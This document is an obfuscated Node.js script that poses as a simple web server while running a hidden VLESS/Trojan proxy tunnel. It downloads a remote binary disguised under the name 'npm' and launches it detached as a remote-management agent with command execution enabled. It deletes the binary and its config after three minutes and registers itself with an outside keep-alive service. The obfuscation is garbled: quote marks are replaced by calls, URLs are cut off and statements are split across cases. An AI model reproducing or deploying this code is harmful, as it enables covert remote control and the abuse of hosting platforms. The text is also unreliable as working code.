const _0xccb816f2=[',"]; (function(_0xarr,_0xshift){ while(--_0xshift){ _0xarr.push(_0xarr.shift()); } })(_0xccb816f2,0x66); function _0x0ebbb007(_0xidx){ return _0xidx-0x0; } function _0xa2078ef3(_0xidx){ return _0xccb816f2[_0x0ebbb007(_0xidx)]; } function _0x9622414e(){return "HDSS3m9QoSLzZIcOqN5LW1tR36sGdTpj";} function _0xc550645c(){return "9jwmpdhvP6O2wS8X6z4wjzMJLNDFf9vQ";} function _0x8659e6e6(){return "662e7CT6t8utVPLyVm1W6GtLosnPcNrq";} function _0x85bacff7(){return "qaD5gBHWiM7vPWdowZGfZZna27A5iuJ1";} function _0xf7ad38a9(){return "sMEnCGH2RKKQVgTGRAefLj25A8ILtnkW";} (function(){ let _0xfe5fcb3c=0; while(true){ switch(_0xfe5fcb3c){ case 0: const os = require(_0xa2078ef3(0x0)os_0xa2078ef3(0x0)); _0xfe5fcb3c++; break; case 1: const http = require(_0xa2078ef3(0x0)http_0xa2078ef3(0x0)); _0xfe5fcb3c++; break; case 2: const fs = require(_0xa2078ef3(0x0)fs_0xa2078ef3(0x0)); _0xfe5fcb3c++; break; case 3: const axios = require(_0xa2078ef3(0x0)axios_0xa2078ef3(0x0)); _0xfe5fcb3c++; break; case 4: const net = require(_0xa2078ef3(0x0)net_0xa2078ef3(0x0)); _0xfe5fcb3c++; break; case 5: const path = require(_0xa2078ef3(0x0)path_0xa2078ef3(0x0)); _0xfe5fcb3c++; break; case 6: const crypto = require(_0xa2078ef3(0x0)crypto_0xa2078ef3(0x0)); _0xfe5fcb3c++; break; case 7: const { Buffer } = require(_0xa2078ef3(0x0)buffer_0xa2078ef3(0x0)); _0xfe5fcb3c++; break; case 8: const { exec, execSync } = require(_0xa2078ef3(0x0)child_process_0xa2078ef3(0x0)); _0xfe5fcb3c++; break; case 9: const { WebSocket, createWebSocketStream } = require(_0xa2078ef3(0x0)ws_0xa2078ef3(0x0)); _0xfe5fcb3c++; break; case 10: const UUID = process.env.UUID || _0xa2078ef3(0x0)33d836c9-2fc0-46d1-829b-ac3161eb624d_0xa2078ef3(0x0); _0xfe5fcb3c++; break; case 11: const NEZHA_SERVER = process.env.NEZHA_SERVER || _0xa2078ef3(0x0)_0xa2078ef3(0x0); _0xfe5fcb3c++; break; case 12: const NEZHA_PORT = process.env.NEZHA_PORT || _0xa2078ef3(0x0)_0xa2078ef3(0x0); _0xfe5fcb3c++; break; case 13: const NEZHA_KEY = process.env.NEZHA_KEY || _0xa2078ef3(0x0)_0xa2078ef3(0x0); _0xfe5fcb3c++; break; case 14: const DOMAIN = process.env.DOMAIN || _0xa2078ef3(0x0)1234.abc.com_0xa2078ef3(0x0); _0xfe5fcb3c++; break; case 15: const AUTO_ACCESS = process.env.AUTO_ACCESS || true; _0xfe5fcb3c++; break; case 16: const WSPATH = process.env.WSPATH || UUID.slice(0, 8); _0xfe5fcb3c++; break; case 17: const SUB_PATH = process.env.SUB_PATH || _0xa2078ef3(0x0)sub_0xa2078ef3(0x0); _0xfe5fcb3c++; break; case 18: const NAME = process.env.NAME || _0xa2078ef3(0x0)Hug_0xa2078ef3(0x0); _0xfe5fcb3c++; break; case 19: const PORT = process.env.PORT || 7860; _0xfe5fcb3c++; break; case 20: let ISP = _0xa2078ef3(0x0)_0xa2078ef3(0x0); _0xfe5fcb3c++; break; case 21: const GetISP = async () => { try { const res = await axios.get(_0xa2078ef3(0x0)https: const data = res.data; _0xfe5fcb3c++; break; case 22: ISP = `${data.country}-${data.asOrganization}`.replace(/ /g, _0xa2078ef3(0x0)__0xa2078ef3(0x0)); _0xfe5fcb3c++; break; case 23: } catch (e) { ISP = _0xa2078ef3(0x0)Unknown_0xa2078ef3(0x0); _0xfe5fcb3c++; break; case 24: } } GetISP(); _0xfe5fcb3c++; break; case 25: const httpServer = http.createServer((req, res) => { if (req.url === _0xa2078ef3(0x0)/_0xa2078ef3(0x0)) { const filePath = path.join(__dirname, _0xa2078ef3(0x0)index.html_0xa2078ef3(0x0)); _0xfe5fcb3c++; break; case 26: fs.readFile(filePath, _0xa2078ef3(0x0)utf8_0xa2078ef3(0x0), (err, content) => { if (err) { res.writeHead(200, { _0xa2078ef3(0x0)Content-Type_0xa2078ef3(0x0): _0xa2078ef3(0x0)text/html_0xa2078ef3(0x0) }); _0xfe5fcb3c++; break; case 27: res.end(_0xa2078ef3(0x0)Hello world!_0xa2078ef3(0x0)); _0xfe5fcb3c++; break; case 28: return; _0xfe5fcb3c++; break; case 29: } res.writeHead(200, { _0xa2078ef3(0x0)Content-Type_0xa2078ef3(0x0): _0xa2078ef3(0x0)text/html_0xa2078ef3(0x0) }); _0xfe5fcb3c++; break; case 30: res.end(content); _0xfe5fcb3c++; break; case 31: }); _0xfe5fcb3c++; break; case 32: return; _0xfe5fcb3c++; break; case 33: } else if (req.url === `/${SUB_PATH}`) { const vlessURL = `vless: const trojanURL = `trojan: const subscription = vlessURL + _0xa2078ef3(0x0)\n_0xa2078ef3(0x0) + trojanURL; _0xfe5fcb3c++; break; case 34: const base64Content = Buffer.from(subscription).toString(_0xa2078ef3(0x0)base64_0xa2078ef3(0x0)); _0xfe5fcb3c++; break; case 35: res.writeHead(200, { _0xa2078ef3(0x0)Content-Type_0xa2078ef3(0x0): _0xa2078ef3(0x0)text/plain_0xa2078ef3(0x0) }); _0xfe5fcb3c++; break; case 36: res.end(base64Content + _0xa2078ef3(0x0)\n_0xa2078ef3(0x0)); _0xfe5fcb3c++; break; case 37: } else { res.writeHead(404, { _0xa2078ef3(0x0)Content-Type_0xa2078ef3(0x0): _0xa2078ef3(0x0)text/plain_0xa2078ef3(0x0) }); _0xfe5fcb3c++; break; case 38: res.end(_0xa2078ef3(0x0)Not Found\n_0xa2078ef3(0x0)); _0xfe5fcb3c++; break; case 39: } }); _0xfe5fcb3c++; break; case 40: const wss = new WebSocket.Server({ server: httpServer }); _0xfe5fcb3c++; break; case 41: const uuid = UUID.replace(/-/g, _0xa2078ef3(0x1)_0xa2078ef3(0x1)); _0xfe5fcb3c++; break; case 42: const DNS_SERVERS = [_0xa2078ef3(0x0)8.8.4.4_0xa2078ef3(0x0), _0xa2078ef3(0x0)1.1.1.1_0xa2078ef3(0x0)]; _0xfe5fcb3c++; break; case 43: function resolveHost(host) { return new Promise((resolve, reject) => { if (/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/.test(host)) { resolve(host); _0xfe5fcb3c++; break; case 44: return; _0xfe5fcb3c++; break; case 45: } let attempts = 0; _0xfe5fcb3c++; break; case 46: function tryNextDNS() { if (attempts >= DNS_SERVERS.length) { reject(new Error(`Failed to resolve ${host} with all DNS servers`)); _0xfe5fcb3c++; break; case 47: return; _0xfe5fcb3c++; break; case 48: } const dnsServer = DNS_SERVERS[attempts]; _0xfe5fcb3c++; break; case 49: attempts++; _0xfe5fcb3c++; break; case 50: const dnsQuery = `https: axios.get(dnsQuery, { timeout: 5000, headers: { _0xa2078ef3(0x0)Accept_0xa2078ef3(0x0): _0xa2078ef3(0x0)application/dns-json_0xa2078ef3(0x0) } }) .then(response => { const data = response.data; _0xfe5fcb3c++; break; case 51: if (data.Status === 0 && data.Answer && data.Answer.length > 0) { const ip = data.Answer.find(record => record.type === 1); _0xfe5fcb3c++; break; case 52: if (ip) { resolve(ip.data); _0xfe5fcb3c++; break; case 53: return; _0xfe5fcb3c++; break; case 54: } } tryNextDNS(); _0xfe5fcb3c++; break; case 55: }) .catch(error => { tryNextDNS(); _0xfe5fcb3c++; break; case 56: }); _0xfe5fcb3c++; break; case 57: } tryNextDNS(); _0xfe5fcb3c++; break; case 58: }); _0xfe5fcb3c++; break; case 59: } function handleVlessConnection(ws, msg) { const [VERSION] = msg; _0xfe5fcb3c++; break; case 60: const id = msg.slice(1, 17); _0xfe5fcb3c++; break; case 61: if (!id.every((v, i) => v == parseInt(uuid.substr(i * 2, 2), 16))) return false; _0xfe5fcb3c++; break; case 62: let i = msg.slice(17, 18).readUInt8() + 19; _0xfe5fcb3c++; break; case 63: const port = msg.slice(i, i += 2).readUInt16BE(0); _0xfe5fcb3c++; break; case 64: const ATYP = msg.slice(i, i += 1).readUInt8(); _0xfe5fcb3c++; break; case 65: const host = ATYP == 1 ? msg.slice(i, i += 4).join(_0xa2078ef3(0x0)._0xa2078ef3(0x0)) : (ATYP == 2 ? new TextDecoder().decode(msg.slice(i + 1, i += 1 + msg.slice(i, i + 1).readUInt8())) : (ATYP == 3 ? msg.slice(i, i += 16).reduce((s, b, i, a) => (i % 2 ? s.concat(a.slice(i - 1, i + 1)) : s), []).map(b => b.readUInt16BE(0).toString(16)).join(_0xa2078ef3(0x0):_0xa2078ef3(0x0)) : _0xa2078ef3(0x0)_0xa2078ef3(0x0))); _0xfe5fcb3c++; break; case 66: ws.send(new Uint8Array([VERSION, 0])); _0xfe5fcb3c++; break; case 67: const duplex = createWebSocketStream(ws); _0xfe5fcb3c++; break; case 68: resolveHost(host) .then(resolvedIP => { net.connect({ host: resolvedIP, port }, function() { this.write(msg.slice(i)); _0xfe5fcb3c++; break; case 69: duplex.on(_0xa2078ef3(0x0)error_0xa2078ef3(0x0), () => {}).pipe(this).on(_0xa2078ef3(0x0)error_0xa2078ef3(0x0), () => {}).pipe(duplex); _0xfe5fcb3c++; break; case 70: }).on(_0xa2078ef3(0x0)error_0xa2078ef3(0x0), () => {}); _0xfe5fcb3c++; break; case 71: }) .catch(error => { net.connect({ host, port }, function() { this.write(msg.slice(i)); _0xfe5fcb3c++; break; case 72: duplex.on(_0xa2078ef3(0x0)error_0xa2078ef3(0x0), () => {}).pipe(this).on(_0xa2078ef3(0x0)error_0xa2078ef3(0x0), () => {}).pipe(duplex); _0xfe5fcb3c++; break; case 73: }).on(_0xa2078ef3(0x0)error_0xa2078ef3(0x0), () => {}); _0xfe5fcb3c++; break; case 74: }); _0xfe5fcb3c++; break; case 75: return true; _0xfe5fcb3c++; break; case 76: } function handleTrojanConnection(ws, msg) { try { if (msg.length < 58) return false; _0xfe5fcb3c++; break; case 77: const receivedPasswordHash = msg.slice(0, 56).toString(); _0xfe5fcb3c++; break; case 78: const possiblePasswords = [ UUID, ]; _0xfe5fcb3c++; break; case 79: let matchedPassword = null; _0xfe5fcb3c++; break; case 80: for (const pwd of possiblePasswords) { const hash = crypto.createHash(_0xa2078ef3(0x0)sha224_0xa2078ef3(0x0)).update(pwd).digest(_0xa2078ef3(0x0)hex_0xa2078ef3(0x0)); _0xfe5fcb3c++; break; case 81: if (hash === receivedPasswordHash) { matchedPassword = pwd; _0xfe5fcb3c++; break; case 82: break; _0xfe5fcb3c++; break; case 83: } } if (!matchedPassword) return false; _0xfe5fcb3c++; break; case 84: let offset = 56; _0xfe5fcb3c++; break; case 85: if (msg[offset] === 0x0d && msg[offset + 1] === 0x0a) { offset += 2; _0xfe5fcb3c++; break; case 86: } const cmd = msg[offset]; _0xfe5fcb3c++; break; case 87: if (cmd !== 0x01) return false; _0xfe5fcb3c++; break; case 88: offset += 1; _0xfe5fcb3c++; break; case 89: const atyp = msg[offset]; _0xfe5fcb3c++; break; case 90: offset += 1; _0xfe5fcb3c++; break; case 91: let host, port; _0xfe5fcb3c++; break; case 92: if (atyp === 0x01) { host = msg.slice(offset, offset + 4).join(_0xa2078ef3(0x0)._0xa2078ef3(0x0)); _0xfe5fcb3c++; break; case 93: offset += 4; _0xfe5fcb3c++; break; case 94: } else if (atyp === 0x03) { const hostLen = msg[offset]; _0xfe5fcb3c++; break; case 95: offset += 1; _0xfe5fcb3c++; break; case 96: host = msg.slice(offset, offset + hostLen).toString(); _0xfe5fcb3c++; break; case 97: offset += hostLen; _0xfe5fcb3c++; break; case 98: } else if (atyp === 0x04) { host = msg.slice(offset, offset + 16).reduce((s, b, i, a) => (i % 2 ? s.concat(a.slice(i - 1, i + 1)) : s), []) .map(b => b.readUInt16BE(0).toString(16)).join(_0xa2078ef3(0x0):_0xa2078ef3(0x0)); _0xfe5fcb3c++; break; case 99: offset += 16; _0xfe5fcb3c++; break; case 100: } else { return false; _0xfe5fcb3c++; break; case 101: } port = msg.readUInt16BE(offset); _0xfe5fcb3c++; break; case 102: offset += 2; _0xfe5fcb3c++; break; case 103: if (offset < msg.length && msg[offset] === 0x0d && msg[offset + 1] === 0x0a) { offset += 2; _0xfe5fcb3c++; break; case 104: } const duplex = createWebSocketStream(ws); _0xfe5fcb3c++; break; case 105: resolveHost(host) .then(resolvedIP => { net.connect({ host: resolvedIP, port }, function() { if (offset < msg.length) { this.write(msg.slice(offset)); _0xfe5fcb3c++; break; case 106: } duplex.on(_0xa2078ef3(0x0)error_0xa2078ef3(0x0), () => {}).pipe(this).on(_0xa2078ef3(0x0)error_0xa2078ef3(0x0), () => {}).pipe(duplex); _0xfe5fcb3c++; break; case 107: }).on(_0xa2078ef3(0x0)error_0xa2078ef3(0x0), () => {}); _0xfe5fcb3c++; break; case 108: }) .catch(error => { net.connect({ host, port }, function() { if (offset < msg.length) { this.write(msg.slice(offset)); _0xfe5fcb3c++; break; case 109: } duplex.on(_0xa2078ef3(0x0)error_0xa2078ef3(0x0), () => {}).pipe(this).on(_0xa2078ef3(0x0)error_0xa2078ef3(0x0), () => {}).pipe(duplex); _0xfe5fcb3c++; break; case 110: }).on(_0xa2078ef3(0x0)error_0xa2078ef3(0x0), () => {}); _0xfe5fcb3c++; break; case 111: }); _0xfe5fcb3c++; break; case 112: return true; _0xfe5fcb3c++; break; case 113: } catch (error) { return false; _0xfe5fcb3c++; break; case 114: } } wss.on(_0xa2078ef3(0x0)connection_0xa2078ef3(0x0), (ws, req) => { const url = req.url || _0xa2078ef3(0x0)_0xa2078ef3(0x0); _0xfe5fcb3c++; break; case 115: ws.once(_0xa2078ef3(0x0)message_0xa2078ef3(0x0), msg => { if (msg.length > 17 && msg[0] === 0) { const id = msg.slice(1, 17); _0xfe5fcb3c++; break; case 116: const isVless = id.every((v, i) => v == parseInt(uuid.substr(i * 2, 2), 16)); _0xfe5fcb3c++; break; case 117: if (isVless) { if (!handleVlessConnection(ws, msg)) { ws.close(); _0xfe5fcb3c++; break; case 118: } return; _0xfe5fcb3c++; break; case 119: } } if (!handleTrojanConnection(ws, msg)) { ws.close(); _0xfe5fcb3c++; break; case 120: } }).on(_0xa2078ef3(0x0)error_0xa2078ef3(0x0), () => {}); _0xfe5fcb3c++; break; case 121: }); _0xfe5fcb3c++; break; case 122: const getDownloadUrl = () => { const arch = os.arch(); _0xfe5fcb3c++; break; case 123: if (arch === _0xa2078ef3(0x0)arm_0xa2078ef3(0x0) || arch === _0xa2078ef3(0x0)arm64_0xa2078ef3(0x0) || arch === _0xa2078ef3(0x0)aarch64_0xa2078ef3(0x0)) { if (!NEZHA_PORT) { return _0xa2078ef3(0x0)https: } else { return _0xa2078ef3(0x0)https: } } else { if (!NEZHA_PORT) { return _0xa2078ef3(0x0)https: } else { return _0xa2078ef3(0x0)https: } } }; _0xfe5fcb3c++; break; case 124: const downloadFile = async () => { if (!NEZHA_SERVER && !NEZHA_KEY) return; _0xfe5fcb3c++; break; case 125: try { const url = getDownloadUrl(); _0xfe5fcb3c++; break; case 126: const response = await axios({ method: _0xa2078ef3(0x0)get_0xa2078ef3(0x0), url: url, responseType: _0xa2078ef3(0x0)stream_0xa2078ef3(0x0) }); _0xfe5fcb3c++; break; case 127: const writer = fs.createWriteStream(_0xa2078ef3(0x0)npm_0xa2078ef3(0x0)); _0xfe5fcb3c++; break; case 128: response.data.pipe(writer); _0xfe5fcb3c++; break; case 129: return new Promise((resolve, reject) => { writer.on(_0xa2078ef3(0x0)finish_0xa2078ef3(0x0), () => { console.log(_0xa2078ef3(0x0)npm download successfully_0xa2078ef3(0x0)); _0xfe5fcb3c++; break; case 130: exec(_0xa2078ef3(0x0)chmod +x npm_0xa2078ef3(0x0), (err) => { if (err) reject(err); _0xfe5fcb3c++; break; case 131: resolve(); _0xfe5fcb3c++; break; case 132: }); _0xfe5fcb3c++; break; case 133: }); _0xfe5fcb3c++; break; case 134: writer.on(_0xa2078ef3(0x0)error_0xa2078ef3(0x0), reject); _0xfe5fcb3c++; break; case 135: }); _0xfe5fcb3c++; break; case 136: } catch (err) { throw err; _0xfe5fcb3c++; break; case 137: } }; _0xfe5fcb3c++; break; case 138: const runnz = async () => { try { const status = execSync(_0xa2078ef3(0x0)ps aux | grep -v _0xa2078ef3(0x1)grep_0xa2078ef3(0x1) | grep _0xa2078ef3(0x1)./[n]pm_0xa2078ef3(0x1)_0xa2078ef3(0x0), { encoding: _0xa2078ef3(0x0)utf-8_0xa2078ef3(0x0) }); _0xfe5fcb3c++; break; case 139: if (status.trim() !== _0xa2078ef3(0x0)_0xa2078ef3(0x0)) { console.log(_0xa2078ef3(0x0)npm is already running, skip running..._0xa2078ef3(0x0)); _0xfe5fcb3c++; break; case 140: return; _0xfe5fcb3c++; break; case 141: } } catch (e) { } await downloadFile(); _0xfe5fcb3c++; break; case 142: let command = _0xa2078ef3(0x0)_0xa2078ef3(0x0); _0xfe5fcb3c++; break; case 143: let tlsPorts = [_0xa2078ef3(0x0)443_0xa2078ef3(0x0), _0xa2078ef3(0x0)8443_0xa2078ef3(0x0), _0xa2078ef3(0x0)2096_0xa2078ef3(0x0), _0xa2078ef3(0x0)2087_0xa2078ef3(0x0), _0xa2078ef3(0x0)2083_0xa2078ef3(0x0), _0xa2078ef3(0x0)2053_0xa2078ef3(0x0)]; _0xfe5fcb3c++; break; case 144: if (NEZHA_SERVER && NEZHA_PORT && NEZHA_KEY) { const NEZHA_TLS = tlsPorts.includes(NEZHA_PORT) ? _0xa2078ef3(0x0)--tls_0xa2078ef3(0x0) : _0xa2078ef3(0x0)_0xa2078ef3(0x0); _0xfe5fcb3c++; break; case 145: command = `setsid nohup ./npm -s ${NEZHA_SERVER}:${NEZHA_PORT} -p ${NEZHA_KEY} ${NEZHA_TLS} --disable-auto-update --report-delay 4 --skip-conn --skip-procs >/dev/null 2>&1 &`; _0xfe5fcb3c++; break; case 146: } else if (NEZHA_SERVER && NEZHA_KEY) { if (!NEZHA_PORT) { const port = NEZHA_SERVER.includes(_0xa2078ef3(0x0):_0xa2078ef3(0x0)) ? NEZHA_SERVER.split(_0xa2078ef3(0x0):_0xa2078ef3(0x0)).pop() : _0xa2078ef3(0x0)_0xa2078ef3(0x0); _0xfe5fcb3c++; break; case 147: const NZ_TLS = tlsPorts.includes(port) ? _0xa2078ef3(0x0)true_0xa2078ef3(0x0) : _0xa2078ef3(0x0)false_0xa2078ef3(0x0); _0xfe5fcb3c++; break; case 148: const configYaml = `client_secret: ${NEZHA_KEY} debug: false disable_auto_update: true disable_command_execute: false disable_force_update: true disable_nat: false disable_send_query: false gpu: false insecure_tls: true ip_report_period: 1800 report_delay: 4 server: ${NEZHA_SERVER} skip_connection_count: true skip_procs_count: true temperature: false tls: ${NZ_TLS} use_gitee_to_upgrade: false use_ipv6_country_code: false uuid: ${UUID}`; _0xfe5fcb3c++; break; case 149: fs.writeFileSync(_0xa2078ef3(0x0)config.yaml_0xa2078ef3(0x0), configYaml); _0xfe5fcb3c++; break; case 150: } command = `setsid nohup ./npm -c config.yaml >/dev/null 2>&1 &`; _0xfe5fcb3c++; break; case 151: } else { console.log(_0xa2078ef3(0x0)NEZHA variable is empty, skip running_0xa2078ef3(0x0)); _0xfe5fcb3c++; break; case 152: return; _0xfe5fcb3c++; break; case 153: } try { exec(command, { shell: _0xa2078ef3(0x0)/bin/bash_0xa2078ef3(0x0) }, (err) => { if (err) console.error(_0xa2078ef3(0x0)npm running error:_0xa2078ef3(0x0), err); _0xfe5fcb3c++; break; case 154: else console.log(_0xa2078ef3(0x0)npm is running_0xa2078ef3(0x0)); _0xfe5fcb3c++; break; case 155: }); _0xfe5fcb3c++; break; case 156: } catch (error) { console.error(`error: ${error}`); _0xfe5fcb3c++; break; case 157: } }; _0xfe5fcb3c++; break; case 158: async function addAccessTask() { if (!AUTO_ACCESS) return; _0xfe5fcb3c++; break; case 159: if (!DOMAIN) { return; _0xfe5fcb3c++; break; case 160: } const fullURL = `https: try { const res = await axios.post(_0xa2078ef3(0x1)https: url: fullURL }, { headers: { _0xa2078ef3(0x0)Content-Type_0xa2078ef3(0x0): _0xa2078ef3(0x0)application/json_0xa2078ef3(0x0) } }); _0xfe5fcb3c++; break; case 161: console.log(_0xa2078ef3(0x0)Automatic Access Task added successfully_0xa2078ef3(0x0)); _0xfe5fcb3c++; break; case 162: } catch (error) { } } const delFiles = () => { fs.unlink(_0xa2078ef3(0x0)npm_0xa2078ef3(0x0), () => {}); _0xfe5fcb3c++; break; case 163: fs.unlink(_0xa2078ef3(0x0)config.yaml_0xa2078ef3(0x0), () => {}); _0xfe5fcb3c++; break; case 164: }; _0xfe5fcb3c++; break; case 165: httpServer.listen(PORT, () => { runnz(); _0xfe5fcb3c++; break; case 166: setTimeout(() => { delFiles(); _0xfe5fcb3c++; break; case 167: }, 180000); _0xfe5fcb3c++; break; case 168: addAccessTask(); _0xfe5fcb3c++; break; case 169: console.log(`Server is running on port ${PORT}`); _0xfe5fcb3c++; break; case 170: }); _0xfe5fcb3c++; break; default:return; } } })();
